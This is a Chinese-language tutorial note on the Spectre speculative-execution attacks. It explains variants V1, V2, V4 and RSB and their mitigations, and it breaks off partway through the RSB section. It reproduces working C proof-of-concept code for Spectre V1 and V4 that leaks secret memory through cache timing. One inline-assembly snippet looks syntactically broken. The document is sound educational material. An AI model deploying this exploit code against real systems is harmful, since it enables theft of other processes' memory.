# Spectre Attacks: Exploiting Speculative Execution

[TOC]

## 1.引言

几乎所有现代CPU都实现了某种形式的预测执行（speculative execution）：一种优化技术，其中某些指令在确定它们实际上应该执行之前被执行为“猜测”。现代处理器使用分支预测和推测执行来最大化性能。当CPU执行一个对指令指针影响不立即知晓的指令（例如，基于仍未完成的操作结果进行分支），CPU可能使用某种启发式方法来预测结果的指令指针（分支预测），然后基于此继续执行，同时将所有输出缓冲，直到真正的结果被确定（然后根据预测的准确性决定是否提交或丢弃缓冲的输出）。


在本文中，我们分析了这种不正确的推测执行的安全影响。我们提出了一类微架构攻击，我们称之为Spectre攻击。在高级别上，Spectre攻击会诱骗处理器推测性地执行在正确程序执行下不应执行的指令序列。由于这些指令对 CPU 状态的影响最终会恢复，因此我们称它们为瞬态指令。

Spectre攻击的具体方法和多种变体，这些攻击可以在不同场景中执行。例如：

- **从其他进程获取信息**：攻击者可以操纵预测执行，使其能够读取属于其他运行中的应用程序的数据。
- **访问内核内存**：如果操作系统存在漏洞，攻击者可以间接读取通常受保护的内存区域的数据，如内核空间，这部分内存是保留给操作系统核心功能的。

- **违反沙箱**：许多编程语言和框架使用“沙箱”来隔离和保护应用程序。但Spectre攻击可以绕过这些保护机制。预测执行可能导致意外的执行路径，从而可能泄露受控环境中的敏感信息，破坏沙箱旨在提供的隔离。



Spectre攻击一般性描述：

发起 Spectre 攻击，攻击者首先在进程地址空间内定位或引入一系列指令，这些指令在执行时充当隐蔽通道发射器，泄漏受害者的内存或寄存器内容。

然后，攻击者诱骗 CPU 推测性地错误地执行此指令序列，从而通过隐蔽通道泄露受害者的信息。

最后，攻击者通过隐蔽通道检索受害者的信息。尽管这种错误的推测执行导致的CPU状态的更改最终会被恢复，但以前泄露的信息或对 CPU 的其他微架构状态的更改（例如，缓存内容）可以在状态恢复后继续存在。



验证了实施推测执行的处理器例如Intel，AMD，ARM。

## 2.背景

### **2.1. 预测执行（Speculative execution）** 

主要指现代处理器在执行指令时，为了提高性能而采用的一种技术。这种技术的具体含义和运作方式如下：

1. **背景**：现代处理器需要快速处理大量指令，但在某些情况下，处理器无法立即确定下一条指令的执行路径。例如，当遇到条件分支（如`if`语句）时，处理器需要等待条件判断的结果，但这可能会导致性能下降。
2. **工作原理**：

- **预测**：为了减少等待时间，处理器会“猜测”可能的执行路径，并开始提前执行这些指令。这种猜测基于历史执行数据和分支预测算法，处理器维护了一些关于以往分支决策的记录来帮助做出预测。
- **执行**：处理器在进行预测的同时，会保存当前的寄存器状态（checkpoint），然后开始执行预测的指令序列。
- **验证**：当条件最终被确定后，处理器会查看自己最初的猜测是否正确：
- **如果正确**，则将预测执行的结果提交，这样就可以利用这些先前的计算结果提高效率。
- **如果错误**，处理器将丢弃已执行但错误的指令，并恢复到之前保存的寄存器状态，从而不影响程序的正常执行。

### **2.2. 分支预测（Branch prediction）**

在进行预测执行时，处理器在遇到分支指令（比如条件语句）时，需猜测哪个执行路径（分支）将被选中。通过提前预测这些分支的结果，处理器可以在等待计算结果时继续执行其他指令，从而提高整体性能。

### **2.3.微架构侧信道攻击**

两种常用的微架构侧信道攻击技术，即 **Flush+Reload** 和 **Evict+Reload**，用于从受害者的缓存中提取敏感信息。以下是对这段文字的解释：

1. **攻击的总体思路**：

- 攻击者首先需要把一个特定的缓存行从与受害者共享的缓存中清除（evict，逐出）。这种缓存行通常是存储敏感数据的。
- 然后，受害者在执行操作时，攻击者会跟踪受害者是否访问了这个被监视的缓存行。
- 攻击者测量读取该缓存行对应地址所需的时间，如果数据被访问过，则读取会很快速；如果没有被访问，读取则会很慢。通过这种时间差，攻击者可以判断受害者是否在对应的时间间隔内访问了特定的缓存数据。

1. **技术实现**：

- **Flush+Reload**：在这种技术中，攻击者使用专门的机器指令，如 x86 架构中的 `clflush` 指令，手动将特定的缓存行从缓存中清除。这意味着攻击者可以直接控制哪些数据不再保留在缓存中。
- **Evict+Reload**：这种技术则通过迫使缓存中的争用（contention）来逐出目标缓存行。换句话说，攻击者会访问多个内存地址，这些地址与目标缓存行映射到同一个缓存集合。由于缓存的有限大小，频繁的访问会导致缓存中的某些数据被驱逐，从而使得之前的目标缓存行被删除。

## 3，攻击概述

Spectre 攻击诱使受害者推测性地执行在严格序列化按顺序处理程序指令期间不会发生的操作，并通过秘密渠道将受害者的机密信息泄露给对手。

1. 在大多数情况下，攻击从设置阶段开始，在该阶段，攻击者执行使处理器训练错误的操作，以便它稍后做出可利用的错误推测预测。此外，设置阶段可能包括有助于诱导推测执行的步骤，例如纵缓存状态以删除处理器确定实际控制流所需的数据。在设置阶段，攻击者还可以准备用于提取受害者信息的隐蔽通道，例如，通过执行 Flush+Reload 或 Evict+Reload 攻击的 flush 或 evict 部分。
2. 在第二阶段，处理器推测性地执行指令，将机密信息从受害者上下文传输到微架构隐蔽通道。这可能是通过让攻击者请求受害者执行操作来触发的。在其他情况下，攻击者可能会利用其自身代码的推测执行从同一进程获取敏感信息。例如，攻击者的代码被限制在一个安全的执行环境中，通过解释器、即时编译器或某些被认为安全的编程语言来执行，这些环境通常用来保护系统，防止恶意代码访问不应该访问的内存区域或系统资源。尽管推理执行可能会通过广泛的隐蔽通道公开敏感数据，但给出的示例会导致推测执行首先在攻击者选择的地址处读取内存值，然后执行内存作，以公开值的方式修改缓存状态。
3. 在最后阶段，将恢复敏感数据。对于使用 Flush+Reload 或 Evict+Reload 的 Spectre 攻击，恢复过程包括对被监控的高速缓存行中内存地址的访问计时。

Spectre 攻击仅假设推测执行的指令可以从内存中读取受害者进程可以正常访问的内存，例如，不会触发页面错误或异常。因此，Spectre 与 Meltdown 正交，后者利用某些 CPU 允许无序执行用户指令以读取内核内存的情况。因此，即使处理器阻止用户进程中指令的推测性执行访问内核内存，Spectre 攻击仍然有效。

## 4.Spectre V1

在本节中，我们将演示攻击者如何利用条件分支错误预测从另一个上下文（例如，另一个进程）读取任意内存

这里的“代码”是指某个函数的实现，这个函数可能是一个系统调用或库中的某个函数。系统调用是操作系统提供给应用程序的接口，允许程序直接请求操作系统的服务。

**不可信来源**：

- 函数接收到一个无符号整数 `x`，该整数来自一个不可信的来源。这个来源可能是用户提供的数据、网络请求、或者其他可能被篡改的输入。这种输入的处理需要特别小心，因为不可信的数据可以导致安全漏洞。

**数组的定义**：该过程访问两个数组：

- `array1`：一个大小为 `array1_size` 的无符号字节数组。这意味着数组可以存储多个无符号整数，每个整数的大小通常是一个字节（8位）。
- `array2`：一个大小为 1 MB 的无符号字节数组。这个较大的数组可能用于存储更多的数据，或者用于特定的操作或计算。

**安全风险的暗示**：

- 由于 `x` 是来自不可信的来源，攻击者可能故意提供一个恶意值，使得程序在访问这些数组时发生错误。例如，如果 `x` 超出了 `array1` 的有效范围，可能会导致内存泄漏或访问其他不该访问的内存区域，这种情况可以被攻击者利用来窃取敏感信息。

![image-20250226201249874](https://cdn.jsdelivr.net/gh/Seraphinelle/picgo@image/image/20250411161759977.png)

在此示例中，假设攻击者使代码运行：

- x 的值是恶意选择的（越界），因此 array1[x] 解析为受害者内存中某个地方的秘密字节 k;

- array1_size 和 array2 未缓存，但 k 已缓存;

- 以前的作收到了有效的 X 值，导致分支预测器假设 if 可能为 true。

### 分支预测的过程

**值比较与缓存未命中**：

- 处理器首先将恶意输入值x与`array1_size`进行比较。此时，读取`array1_size`未能命中缓存，导致处理器需要从更慢的动态随机存取存储器(DRAM)中获取该值，因此面临显著的延迟。

**分支预测与猜测执行**：

- 在等待`array1_size`的值时，分支预测器假定这次条件判断将为真。基于这个假设，处理器进行猜测执行，通过将x加到`array1`的基地址，向内存子系统请求相应地址的数据。

**缓存命中**：

- 因为这个内存读取操作命中缓存，处理器迅速获取到秘密字节k的值。

**继续猜测执行**：

- 随后，猜测执行仍然继续，处理器使用获取的k值来计算`array2[k * 4096]`的地址，并发起读取这个内存地址的请求。

**再次缓存未命中**：

- 对于`array2[k * 4096]`的读取请求再次导致缓存未命中，意味着需要从DRAM中获取该数据，处理器面临再次延迟。

**错误的猜测执行的回滚**：

- 在发起`array2`的读取后，处理器意识到之前的猜测执行是错误的，因此将寄存器状态回滚到猜测之前的状态。

**猜测执行影响缓存状态**：

- 尽管已经回滚，来自`array2`的猜测读取依然影响了缓存状态。这种影响是地址特定的，也就是说，缓存状态的变化与秘密值k相关联



为了完成攻击，攻击者会测量 array2 中的哪个位置被带入缓存，例如，通过 Flush+Reload 或 Prime+Probe。这揭示了 k 的值，因为受害者的推测执行缓存了 array2 [k × 4096]，导致 array2[i × 4096] 快速读取i = k，但所有其他 k 的速度相对缓慢。

或者，攻击者可以使用Evict+Time方法，通过重新调用一个目标函数并传入一个有效的输入值x'，来测量第二次调用的执行时间。如果`array1[x']`的值等于秘密值k，访问对应的`array2`位置时，数据会在缓存中，这样这个操作的执行速度会更快。因此，执行时间的差异可以让攻击者推测出`array1`中的值是否等于k，从而实现隐私信息的泄露。

（乘以 4096 通过确保 k 的每个潜在值映射到不同的内存页来简化攻击，从而避免了页内预取的影响）

### 利用C语言的实现

Victim Function（受害者函数）：

- 代码中的victim_function接收一个参数 x，并使用该参数访问 array1 中的元素作为索引来访问array2。这实际上模拟了一个真实应用程序中的内存访问模式。在攻击者控制的环境下，x的值会被特意操控，触发缓存访问模式的变化。
- 通过这种方式，受害者函数的行为会导致某些缓存行的加载或未加载，从而能利用缓存时间差来推测出array1中的数据。

Cache Timing Analysis（缓存时间分析）：

- 攻击代码会反复执行并利用_mm_clflush来清除缓存，以确保每次访问内存时都是从主内存读取，这样可以避免缓存命中引起误导。
- __rdtscp用来测量内存访问的时间差，时间差较小意味着访问了缓存（缓存命中），较大的时间差则意味着从主内存加载数据（缓存未命中）。
- 通过多次访问并记录每个内存位置的访问时间，攻击者可以推测出哪些数据是频繁访问的，从而推测出受害者程序中被访问的数据。

恶意行为：

- readMemoryByte函数是关键的攻击函数。它通过不断访问和测试内存，依赖缓存访问时间的变化来推测目标内存中的字节值。通过多次读取和分析缓存命中的情况，最终攻击者可以恢复目标字符串 secret 的内容。

```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char* secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x)
{
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 512];
	}
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t* addr;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 999; tries > 0; tries--)
	{
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)
		{
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			time1 = __rdtscp(&junk); /* READ TIMER */
			junk = *addr; /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, const char* * argv)
{
	printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
	int score[2], len = strlen(secret);
	uint8_t value[2];

	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	if (argc == 3)
	{
		sscanf_s(argv[1], "%p", (void * *)(&malicious_x));
		malicious_x -= (size_t)array1; /* Convert input value into a pointer */
		sscanf_s(argv[2], "%d", &len);
		printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);
	}

	printf("Reading %d bytes:\n", len);
	while (--len >= 0)
	{
		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
		readMemoryByte(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' score=%d ", value[0],
		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X='%c' score=%d)", value[1],
				   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				   score[1]);
		printf("\n");
	}
#ifdef _MSC_VER
	printf("Press ENTER to exit\n");
	getchar();	/* Pause Windows console */
#endif
	return (0);
}
```

![](https://cdn.jsdelivr.net/gh/Seraphinelle/picgo@image/image/20250411161836555.png)

## 5.Spectre V2

本节展示攻击者如何毒害间接分支，并由此产生的对简介分支的错误预测。如果由于缓存未命中而延迟确定间接分支的目标地址，则推测执行通常会在根据先前代码执行预测的位置继续。在 Spectre V2 中，攻击者将分支预测器与恶意目标误训练，从而在攻击者选择的位置继续执行。

- 攻击者首先在一个上下文中（例如，某个程序块中）训练预测器，然后在另一个上下文中（可能是一个不同的程序或执行环境）应用这种预测。这种方法使得在正常执行流程中不应发生的分支也能被执行，允许继续在攻击者选择的位置进行推测执行。

- 通过这种方式，即使在正常情况下某些地址并不会被访问，攻击者能够导致CPU在这些特定地址上执行代码。这意味着攻击者可以在没有利用条件分支错误预测的情况下，依然能获取到受害者的内存信息。这种能力使得Spectre变体2非常强大，攻击者可以利用这一点来突破内存隔离，泄露敏感数据。

![image-20250227165134211](https://cdn.jsdelivr.net/gh/Seraphinelle/picgo@image/image/20250411161929000.png)

图中分支预测器在 attacker控制的上下文 A 中进行了（错误）训练。在上下文 B 中，分支预测器根据上下文 A 的训练数据进行预测，导致在攻击者选择的地址处进行推测执行，该地址对应于 Spectre gadget在受害者地址空间中的位置。

示例攻击中，攻击者的目标是读取受害者进程的内存。攻击者通过控制两个寄存器来实现这一目标。

- 攻击者通过对寄存器的控制，能够操纵即将执行的指令。当间接分支发生时，寄存器中的值可能决定程序执行的位置。因此，如果攻击者可以控制这些寄存器，就能影响指令的执行流。

- 函数通常在执行时会处理寄存器的值。调用函数时，这些寄存器的值一般会被推送到堆栈中，函数执行完毕后再从堆栈中恢复。这意味着即使寄存器的值是攻击者控制的，可能在函数内部并不会被直接使用。
- 由于寄存器中的恶意值在函数调用过程中被忽略，这为攻击者提供了一个机会：他们可以通过精心设计的操作，利用函数在执行期间的控制流来访问并泄露敏感信息。

- 要成功执行此攻击，攻击者可能需要找到满足特定条件的“幽灵代码”（通常称为“**Spectre gadget**”），即在受害者的内存中存在能够泄露信息的代码片段。这些代码片段能够在攻击者控制的寄存器的影响下被错误地执行：攻击者可以利用这些片段来执行错误的预测性操作，从而将受害者的敏感信息泄露到一个隐蔽的通道中，例如缓存或其他可观察的微架构特性中。

- 一个简单有效的Spectre gadget通常由两条指令组成。这两条指令不需要相邻。第一条指令会将一个由攻击者控制的寄存器（R1）所指向的内存位置中的内容（例如，执行加法、异或或减法操作）传递到另一个攻击者控制的寄存器（R2）中。
- 紧接着，第二条指令则访问寄存器R2所指向的内存地址。这两个指令的联合作用使攻击者能够控制需要泄露哪个地址的信息（通过R1）以及如何映射这个泄露内存到第二条指令所读取的地址（通过R2）。

- 要使这些Spectre gadgets生效，这段代码必须存在于受害者可以执行的内存中。这意味着在攻击者发起攻击的过程中，这段代码必须已经被加载到内存中，并且受害者的进程能够访问它。

- 大多数现代程序都会映射大量的共享库到它们的进程地址空间中。这些库中可能包含了多个可以利用的Spectre gadgets。这为攻击者提供了一个巨大的搜索空间，使他们可以在共享库中寻找漏洞，而不需要直接搜索受害者本身的代码，从而增加了成功实施攻击的机会。

![image-20250320165954325](https://cdn.jsdelivr.net/gh/Seraphinelle/picgo@image/image/20250411162023184.png)

## 6.缓解策略

### 6.1.防止预测执行

防止投机执行是防止Spectre攻击的关键。要有效阻止投机执行，需要确保指令在控制流明确后才执行，但这会严重影响处理器性能。当前处理器不支持软件禁用投机执行，未来可能通过微代码更改来实现。

一个可行的方法是修改软件，使用序列化或投机阻止指令，确保后续指令不被投机执行。x86架构推荐使用lfence指令。虽然在每个条件分支后添加此类指令可以提高安全性，但同样会禁用分支预测，从而影响性能。

当前的方法要求对所有潜在脆弱的软件进行更新，这对遗留软件构成挑战。此外，现有方案主要针对Spectre的变体1，未能涵盖所有变体。

### 6.2.阻止访问secret数据

为了防止投机执行代码访问秘密数据，采取了以下对策：

1. **网页进程隔离**：谷歌Chrome浏览器通过为每个网站执行在独立的进程中，限制攻击者利用Spectre攻击泄露数据。这样，使用JavaScript的攻击无法访问其他网站进程的数据。
2. **WebKit策略**：

- **索引掩码**：WebKit通过将数组边界检查替换为索引掩码，应用位掩码来限制数组索引，确保它不会显著超出数组大小。虽然掩码可能导致越界访问，但可以限制越界的范围，从而防止攻击者访问任意内存。
- **指针保护**：通过将指针与伪随机的“毒值”进行异或（xor）来保护指针的访问。未了解毒值的攻击者无法使用被污染的指针，同时“毒值”确保分支指令的预测错误不会导致指针指向不相干的类型

### 6.3.防止数据进入隐蔽通道

未来的处理器有可能跟踪数据是否是作为推测操作的结果获取的，并且如果是这样，可以防止在可能泄漏数据的后续操作中使用该数据。

### 6.4.限制从隐蔽通道提取数据

为了从瞬态指令中窃取信息，Spectre攻击利用了隐秘通信渠道。已经提出了多种方法来减轻这种通道的影响。作为对我们基于JavaScript的攻击的一种尝试性缓解措施，主要的浏览器提供商进一步降低了JavaScript计时器的分辨率，可能添加了抖动。这些修补程序还禁用了SharedArrayBuffers，这些缓冲区可以用于创建计时源 。

当前的处理器缺乏完全消除隐秘通信渠道所需的机制。因此，尽管这种方法可能降低攻击性能，但并不能保证攻击不可能发生。

### 6.5.预防分支毒化

该措施是针对 Spectre-v2 的缓解措施。

为了防止间接分支污染，英特尔和AMD通过扩展ISA引入了一种控制间接分支的机制。该机制由三个控制组成。

**间接分支限制预测（IBRS）**：该机制阻止特权代码中的间接分支受到非特权代码分支的影响。处理器进入特殊的IBRS模式，并确保在该模式外的计算不会影响IBRS模式的行为。

**单线程间接分支预测（STIBP）**：该机制限制了在同一核心的超线程上执行的软件之间共享分支预测，以增强安全性。

**间接分支预测屏障（IBPB）**：此机制确保在设置屏障之前运行的软件对在屏障之后运行的软件的分支预测没有影响，通过刷新分支目标缓冲（BTB）状态来实现。

## 7.spectreV4        CVE-2018-3639

Speculative Store Bypass (SSB).

### 7.1.攻击原理

由于CPU为了提高内存的访问速度，提升CPU的性能；从而允许内存加载指令(load)可以被推断执行，而不用等待它前面的存储指令(store)全部完成。这里有两种可能：

- 如果这条load指令不依赖前面的store指令，这个推断执行没有问题，CPU性能得到了提升；
- 如果这条load指令对前面的某条store指令有依赖关系，则这个推断执行是错误的，从而使这个[load指令](https://zhida.zhihu.com/search?content_id=175976174&content_type=Article&match_order=3&q=load指令&zhida_source=entity)读取了错误的数据（最起码加载到了data cache）。这就为侧信道攻击提供了机会；

内存消歧（Memory Disambiguation)技术：高性能乱序处理器采用该技术来高效地执行存储器相关的load和store操作，处理器通过一组内置逻辑电路来检测这些存储操作的真、假依赖关系，通过消除假的依赖关系来充分利用CPU的指令并行性，假如发生依赖关系判断错误则需要能够从错误中恢复过来。当处理器试图乱序执行指令时，处理器必须尊重指令之间的真正依赖关系。

```risc
add r1,r2,r3
add r5,r1,r4
```

在本例中，第2行的add指令依赖于第1行的加法指令，因为寄存器R1是第2行add操作的源操作数。在第1行的add完成之前，第2行的add无法执行。

在这种情况下，依赖关系是静态的，处理器很容易确定，因为操作数源和目标是都是CPU寄存器。第1行（R1）上的add指令的目标寄存器是指令编码的一部分，因此可以由微处理器在pipeline的解码阶段早期确定。类似地，第2行（R1和R4）上的add指令的源寄存器也被编码到指令本身中，并且在解码中确定。

为了尊重这种真正的依赖性，微处理器的调度程序逻辑将以正确的顺序发出这些指令（先是指令1，然后是指令2），以便在指令2需要时1的结果可用.



当依赖性不能静态确定时，就会出现复杂的情况。由于操作数的位置可以间接地指定为[寄存器操作数](https://zhida.zhihu.com/search?content_id=175976174&content_type=Article&match_order=1&q=寄存器操作数&zhida_source=entity)，而不是直接在[指令编码](https://zhida.zhihu.com/search?content_id=175976174&content_type=Article&match_order=2&q=指令编码&zhida_source=entity)本身中指定，因此这种非静态依赖性会伴随着内存指令（加载和存储）而产生，

```risc-v
store r1,2(r2) #Mem[R2+2]<=R1
load  r3,4(r4) #R3<=Mem[R4+4](possibly dependent on 1.possible same address as above)
```

这里，store指令将寄存器R1的值写入指定的存储器空间，地址为R2寄存器的内容+2（R2+2），load指令读取存储器地址（R4+4）的值(寄存器R4的值+4)。

在执行之前，微处理器不能静态地确定这两条指令中指定的内存地址是相同的还是不同的，因为这些地址取决于寄存器R2和R4中的值。

如果地址不同，则指令是独立的，可以按顺序成功执行。但是，如果地址相同，则load指令依赖于前面存储指令store的值。这就是所谓的模糊依赖。对于模糊依赖，CPU允许推断执行。



让我们考虑如下的代码片段（注此处的pointer为一个内存地址指针概念）：

pointer = secret_ptr; // init

pointer = sane_ptr; // write

value = *pointer; // read

cache_trace = array[value]; // look-up

这个本质上是一个RAW（read-after-write）依赖操作, 该load操作vale = *point本来应该返回sane_ptr的值，但如果由于某些原因sane_ptr的值无法立即获得（比如不在cache中，或者还需要通过复杂的计算），则会执行推断执行，从而使value = *pointer采用secret_ptr的值，并且执行cache_trace = array[value]，尽管CPU最后会修正这种错误，但其留在data cache的残留信息无法消除，攻击者通过分析cache_trace就能够重构secret_ptr.

```c
uint64_t str_index = 1;
uint64_t temp = 0;
uint8_t dummy = 2;
uint64_t str[256];
void victim_function(uint64_t _idx)
{
    str[1] = _idx;
    str_index = str_index << 4;
    asm{ "fcvt.s.lu fa4, %[in] "   # 将无符号长整数转换为单精度浮点数
		"fcvt.s.lu fa5, %[inout] " # 将另一个无符号长整数转换为单精度浮点数
		"fdiv.s fa5, fa5, fa4  "   # fa5 = fa5 / fa4
		"fdiv.s fa5, fa5, fa4 "   # fa5 = fa5 / fa4
		"fdiv.s fa5, fa5, fa4  "  # fa5 = fa5 / fa4
		"fdiv.s fa5, fa5, fa4  "   # fa5 = fa5 / fa4
		"fcvt.lu.s %[out], fa5, rtz " # 将单精度浮点数转换回无符号长整数（向零取整）
        : [out] "=r" (str_index);
        : [input] "r" (str_index),[in] "r" (dummy);
    	:"fa4","fa5"};
    str[str_index]=0;
    temp &= array2[array1[str[1]] * L1_BLOCK_SZ_BYTES];
}
```

我们首先给一个数组的一个元素str[1]赋值一个我们期望攻击的地址，然后通过一个复杂的浮点计算来计算一个变量，并且让这个变量的计算结果也是1，这时我们再重新给str[1]赋值，当然这次赋值不是直接赋值，而是用上面需要计算的变量作为数组的下标，从而造成一种模糊依赖条件；让CPU进入推断执行状态，从而错误地加载一个任意地址的内容进入data cache. 这样就实现了对该地址内容的[侧信道](https://zhida.zhihu.com/search?content_id=175976174&content_type=Article&match_order=2&q=侧信道&zhida_source=entity)攻击。

```C
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <seccomp.h>
#include <linux/seccomp.h>


#include "libcache/cacheutils.h"

// inaccessible (overwritten) secret
#define SECRET      "INACCESSIBLE SECRET"
#define OVERWRITE   '#'

char* data;

char access_array(int x) {
  // store secret in data
  strcpy(data, SECRET);

  // flushing the data which is used in the condition increases
  // probability of speculation
  mfence();
  char** data_slowptr = &data;
  char*** data_slowslowptr = &data_slowptr;
  mfence();
  flush(&x);
  flush(data_slowptr);
  flush(&data_slowptr);
  flush(data_slowslowptr);
  flush(&data_slowslowptr);
  // ensure data is flushed at this point
  mfence();

  // overwrite data via different pointer
  // pointer chasing makes this extremely slow
  (*(*data_slowslowptr))[x] = OVERWRITE;

  // data[x] should now be "#"
  // uncomment next line to break attack
  //mfence();
  // Encode stale value in the cache
  cache_encode(data[x]);
}

int main(int argc, const char **argv) {
  data = malloc(128);
  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
  
  pagesize = sysconf(_SC_PAGESIZE);
  // countermeasure:
  // prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_STORE_BYPASS, PR_SPEC_DISABLE, 0, 0);

// countermeasure 2:
  // prctl(PR_SET_NO_NEW_PRIVS, 1);
  // prctl(PR_SET_DUMPABLE, 0);
  // scmp_filter_ctx ctx;
  // ctx = seccomp_init(SCMP_ACT_ALLOW);
  // seccomp_load(ctx);
  //

  char *_mem = malloc(pagesize * (256 + 4));
  // page aligned
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
  // initialize memory
  memset(mem, 0, pagesize * 256);

  // store secret
  strcpy(data, SECRET);

  // Flush our shared memory
  flush_shared_memory();

  // nothing leaked so far
  char leaked[sizeof(SECRET) + 1];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(SECRET)] = 0;

  int j = 0;
  while(1) {
    // for every byte in the string
    j = (j + 1) % sizeof(SECRET);

    // overwrite value with X, then access
    access_array(j);

    mfence(); // avoid speculation
    // Recover data from covert channel
    cache_decode_pretty(leaked, j);

    if(!strncmp(leaked, SECRET, sizeof(SECRET) - 1))
      break;

    sched_yield();
  }
  printf("\n\n[\x1b[32m>\x1b[0m] Done\n");

  return 0;
}

```

![image-20250320165908683](https://cdn.jsdelivr.net/gh/Seraphinelle/picgo@image/image/20250411162043404.png)

## 8.spectreRSB 

### 8.1.RSB(Return Stack Buffer):

RSB 是一个硬件堆栈缓冲区，当执行一个函数调用指令（如 `call` 指令）时，处理器会将当前执行位置的下一条指令的地址压入到 RSB 中。这一地址就是在函数调用返回时将被用作返回地址。当函数执行完成并遇到返回指令（如 `ret` 指令）时，处理器将从 RSB 中弹出最顶部的地址，以此来确定应该跳转回哪里。

图 2a 显示了执行两个函数调用（F1 和 F2）后 RSB 的状态示例。该图还显示了存储堆栈帧信息和函数返回地址的程序的软件堆栈的状态。

图 2b 显示了在执行函数 F2 的 return 指令时如何使用这些堆栈上的值。此时，来自快速影子堆栈的返回地址用于快速推测返回地址位置。此时执行的指令被认为是推测性的。同时，返回地址是从软件堆栈中获取的，作为函数帧拆解的一部分。返回地址可能在主内存中（未缓存），并在几百个周期后收到。一旦解析了软件堆栈的返回地址，就可以确定推测的结果：如果它与 RSB 的值匹配，则可以提交推测的指令。如果不是，则发生了误测，必须压制投机执行的指令。此行为类似于通过 branch predictor 进行的推测，不同之处在于它是由 return 指令触发的。请注意，错误推测窗口可能会大得多，因为返回可能会不按顺序发出，并且必须在提交之前解决其他依赖项。

![image-20250312165017827](https://cdn.jsdelivr.net/gh/Seraphinelle/picgo@image/image/20250411162053430.png)

### 8.2.RSB攻击来源

当 RSB 中的返回地址值与软件堆栈中的返回地址值不匹配时，RSB 会推测错误，从而导致程序推测到 RSB 中的地址。如果攻击者可以有意触发这种误测，则可以通过 RSB 进行类似**spectre**的攻击。

#### **S1：由于结构大小有限，RSB的过度填充或底部填充**

![image-20250312171717415](https://cdn.jsdelivr.net/gh/Seraphinelle/picgo@image/image/20250411162100450.png)

如果 RSB 为空，我们检查的 Intel CPU 会切换到分支预测器，这可用于通过分支预测器触发攻击。

#### **S2：RSB直接污染**

call 指令将返回地址隐式推送到 RSB 和软件堆栈。但是，攻击者可以替换软件堆栈上的地址（通过直接写入该位置），或者完全删除它（如图 4a 所示）。在这种情况下，RSB 中的值保持不变，并且与软件堆栈上的值不匹配，从而导致在执行返回时出现误测（如图 4b 所示）。

![image-20250312172928214](https://cdn.jsdelivr.net/gh/Seraphinelle/picgo@image/image/20250411162107319.png)

**将调用指令转换为推送和跳转（push and jmp）**：

